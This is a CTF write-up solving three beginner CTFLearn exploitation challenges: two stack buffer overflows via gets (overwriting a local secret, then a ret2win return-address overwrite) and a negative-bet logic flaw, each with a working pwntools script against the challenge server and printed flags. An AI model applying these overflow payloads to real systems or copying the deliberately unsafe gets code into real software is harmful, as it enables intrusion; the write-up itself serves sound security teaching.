---
title: CTFLearn - Easy pwn challenges 
category: writeup
tags: ctfs, pwn
---

# Simple BOF

We have the following message as the challenge description:

> Want to learn the hacker's secret? Try to smash this buffer!

## Code

We have the following source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);
void safeguard();

void print_flag();

void vuln() {
  char padding[16];
  char buff[32];
  int notsecret = 0xffffff00;
  int secret = 0xdeadbeef;

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 

  // Check if secret has changed.
  if (secret == 0x67616c66) {
    puts("You did it! Congratuations!");
    print_flag(); // Print out the flag. You deserve it.
    return;
  } else if (notsecret != 0xffffff00) {
    puts("Uhmm... maybe you overflowed too much. Try deleting a few characters.");
  } else if (secret != 0xdeadbeef) {
    puts("Wow you overflowed the secret value! Now try controlling the value of it!");
  } else {
    puts("Maybe you haven't overflowed enough characters? Try again?");
  }

  exit(0);
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  safeguard();
  vuln();
}
```

Breaking this code down:

- We have 2 character arrays - one with size 16 (padding) and one with size 32 (buff).
- After the `printf` call, the program uses `gets` and copies the content in the buff character array, `gets` is very vulnerable to buffer overflows.
- Then we do a check to see if secret is equal to `0x67616c66` .
- Because the secret variable is defined after the buff variable we might be able to overwrite the contents of that variable to what we want, which in this case is this value: `0x67616c66`

## Exploitation

After connecting to the server we see that the stack trace is being printed out where we can see what and where the values that we need to modify are:

```c
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xffba7228 | 00 00 00 00 00 00 00 00 |
0xffba7230 | 00 00 00 00 00 00 00 00 |
0xffba7238 | 00 00 00 00 00 00 00 00 |
0xffba7240 | 00 00 00 00 00 00 00 00 |
0xffba7248 | ff ff ff ff ff ff ff ff |
0xffba7250 | ff ff ff ff ff ff ff ff |
0xffba7258 | ef be ad de 00 ff ff ff |
0xffba7260 | c0 f5 6d f7 84 df 64 56 |
0xffba7268 | 78 72 ba ff 11 bb 64 56 |
0xffba7270 | 90 72 ba ff 00 00 00 00 |
```

We see that the values we need to overwrite are on the line with the address `0xffba7258` the bytes are `ef be ad de` (`0xdeadbeef`), these are flipped because of the endianness which is explained in this video from [Computerphile](https://youtu.be/NcaiHcBvDR4).

Now all we need to do is read the stack and see where our values land and just over write the `secret` variables value with `0x67616c66` .

After sending it payloads of different values we see that `48` characters is what it takes to get to the secret variables contents and we begin overwriting them.

Now we just create a script that will send `48` characters and then the value we want to overwrite it with (in little endian format) and we get the flag.

 

```python
from pwn import *
# Secret value which we want to overwrite
# p32 function packs the value in a little endian format
secret = p32(0x67616c66)

padding = b"\x41" * 48

p = remote("thekidofarcrania.com", 35235)

p.recv()

p.sendline(padding+secret)

p.interactive()
```

```bash
root:simplebof/ # python3 exploit.py 
[+] Opening connection to thekidofarcrania.com on port 35235: Done
[*] Switching to interactive mode
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xff8fc838 | 00 00 00 00 00 00 00 00 |
0xff8fc840 | 00 00 00 00 00 00 00 00 |
0xff8fc848 | 00 00 00 00 00 00 00 00 |
0xff8fc850 | 00 00 00 00 00 00 00 00 |
0xff8fc858 | ff ff ff ff ff ff ff ff |
0xff8fc860 | ff ff ff ff ff ff ff ff |
0xff8fc868 | ef be ad de 00 ff ff ff |
0xff8fc870 | c0 e5 6d f7 84 2f 64 56 |
0xff8fc878 | 88 c8 8f ff \x1b[0;37m11 0b 64 56 |
0xff8fc880 | a0 c8 8f ff 00 00 00 00 |

Input some text: 
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xff8fc838 | 41 41 41 41 41 41 41 41 |
0xff8fc840 | 41 41 41 41 41 41 41 41 |
0xff8fc848 | 41 41 41 41 41 41 41 41 |
0xff8fc850 | 41 41 41 41 41 41 41 41 |
0xff8fc858 | 41 41 41 41 41 41 41 41 |
0xff8fc860 | 41 41 41 41 41 41 41 41 |
0xff8fc868 | 66 6c 61 67 00 ff ff ff |
0xff8fc870 | c0 e5 6d f7 84 2f 64 56 |
0xff8fc878 | 88 c8 8f ff 11 0b 64 56 |
0xff8fc880 | a0 c8 8f ff 00 00 00 00 |

You did it! Congratuations!
CTFlearn{buffer_0verflows_4re_c00l!}
[*] Got EOF while reading in interactive
```

# RIP my BOF

> Okay so we have a bof, can we get it to redirect IP (instruction pointer) to something else?

We get the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);

void win() {
  system("/bin/cat /flag.txt");
}

void vuln() {
  char padding[16];
  char buff[32];

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Mark the padding with 0xff.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  vuln();
}
```

This seems like a common ret2win pwn challenge where we overwrite the EIP/RIP with the address of the function we want to call. In this case its the win function.

In this code we see that we are using the classic `gets` function again which will let us case an overflow which will let us overwrite the Instruction pointer as there are no safety mechanisms in place.

```c
root:pwn-simple-rip/ # checksec server
[*] '~/pwn-simple-rip/server'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

The buff char array has been assigned 32 bytes.

## GDB

Opening the file up in `gdb` and taking a look at the functions and their addresses we can note down the address of the win function as there are no security mechanisms in place that will randomize the addresses.

```c
gef➤  info functions
---- ----
0x08048586  win
---- ----
```

To test out the buffer overflow we can create a pattern in gdb with the command `pattern create 100` to create a 100 byte pattern.

After running the binary and passing in that pattern we see that it crashes and overwrites the Instruction pointer with the value `0x61616170`

Searching for the pattern using `pattern search 0x61616170` reveals that the value was overwritten after the first 60 bytes.

```c
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1       
$ebx   : 0x6161616e ("naaa"?)
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffd760  →  "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
$ebp   : 0x6161616f ("oaaa"?)
$esi   : 0xf7fa1000  →  0x001e4d6c
$edi   : 0xf7fa1000  →  0x001e4d6c
$eip   : 0x61616170 ("paaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd760│+0x0000: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"       ← $esp
0xffffd764│+0x0004: "raaasaaataaauaaavaaawaaaxaaayaaa"
0xffffd768│+0x0008: "saaataaauaaavaaawaaaxaaayaaa"
0xffffd76c│+0x000c: "taaauaaavaaawaaaxaaayaaa"
0xffffd770│+0x0010: "uaaavaaawaaaxaaayaaa"
0xffffd774│+0x0014: "vaaawaaaxaaayaaa"
0xffffd778│+0x0018: "waaaxaaayaaa"
0xffffd77c│+0x001c: "xaaayaaa"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616170
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server", stopped 0x61616170 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search 0x61616170
[+] Searching '0x61616170'
[+] Found at offset 60 (little-endian search) likely
[+] Found at offset 57 (big-endian search) 
gef➤
```

Now we have an offset of 60 and the address of the win function which we want to call.

Just combining these together and sending this to the server will call the win function and give us the flag.

The following script will exploit it for us:

```python
from pwn import *

p = remote("thekidofarcrania.com", 4902)
padding = b"\x41"*60

win = 0x08048586

p.recv()

p.sendline(padding + p32(win))

p.interactive()
```

```python
root:pwn-simple-rip/ # python3 exploit.py 
[+] Opening connection to thekidofarcrania.com on port 4902: Done
[*] Switching to interactive mode
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffb80d20 | 00 00 00 00 00 00 00 00 |
0xffb80d28 | 00 00 00 00 00 00 00 00 |
0xffb80d30 | 00 00 00 00 00 00 00 00 |
0xffb80d38 | 00 00 00 00 00 00 00 00 |
0xffb80d40 | ff ff ff ff ff ff ff ff |
0xffb80d48 | ff ff ff ff ff ff ff ff |
0xffb80d50 | c0 a5 70 f7 00 a0 04 08 |
0xffb80d58 | 68 0d b8 ff 8b 86 04 08 |
Return address: 0x0804868b

Input some text: 
Legend: buff MODIFIED padding MODIFIED
[+] Opening connection to thekidofarcrania.com on port 4902: Done
[*] Switching to interactive mode
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffb80d20 | 00 00 00 00 00 00 00 00 |
0xffb80d28 | 00 00 00 00 00 00 00 00 |
0xffb80d30 | 00 00 00 00 00 00 00 00 |
0xffb80d38 | 00 00 00 00 00 00 00 00 |
0xffb80d40 | ff ff ff ff ff ff ff ff |
0xffb80d48 | ff ff ff ff ff ff ff ff |
0xffb80d50 | c0 a5 70 f7 00 a0 04 08 |
0xffb80d58 | 68 0d b8 ff 8b 86 04 08 |
Return address: 0x0804868b

Input some text: 
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffb80d20 | 41 41 41 41 41 41 41 41 |
0xffb80d28 | 41 41 41 41 41 41 41 41 |
0xffb80d30 | 41 41 41 41 41 41 41 41 |
0xffb80d38 | 41 41 41 41 41 41 41 41 |
0xffb80d40 | 41 41 41 41 41 41 41 41 |
0xffb80d48 | 41 41 41 41 41 41 41 41 |
0xffb80d50 | 41 41 41 41 41 41 41 41 |
0xffb80d58 | 41 41 41 41 \x1b[0;31;1m86 85 04 08 |
Return address: 0x08048586

CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
```

# Lazy Game Challenge
> I found an interesting game made by some guy named "John_123". It is some betting game. I made some small fixes to the game; see if you can still pwn this and steal $1000000 from me!

This is a very easy challenge as there is no source code to review.

The challenge simply gets the user to connect to the server and play a betting game where they reckon you won't get more than $1000000 at the end.

The rules of the game are given to us at the start:

```python
Rules of the Game :
(1) You will be Given 500$
(2) Place a Bet
(3) Guess the number what computer thinks of !
(4) computer's number changes every new time !.
(5) You have to guess a number between 1-10
(6) You have only 10 tries !.
(7) If you guess a number > 10, it still counts as a Try !
(8) Put your mind, Win the game !..
(9) If you guess within the number of tries, you win money !
(10) Good Luck !..
```

We know a few things right of the bat that we have 500 dollars at the start and betting on a game where if we lose the money will be deducted from our account and we only have 10 guesses.

After starting the game my immediate thought was whether the game would allow me to enter negative values, so that even if I lose I win. 

Entering -1000000 and making guesses that are wrong i.e. `> 10` allows us to lose the bet but because our bet was negative it gets added to our balance and we get the flag.

```python
#!/usr/bin/python3
from pwn import *

p = remote("thekidofarcrania.com", 10001)

p.recv()
# Accept the rules
p.sendline("Y")
# Set a negative bet
p.sendline("-1000000000")
# make a wrong guess 10 times
for i in range(9):
        p.sendline("11")
# Say nah to play again
p.sendline("N")
p.interactive()
```
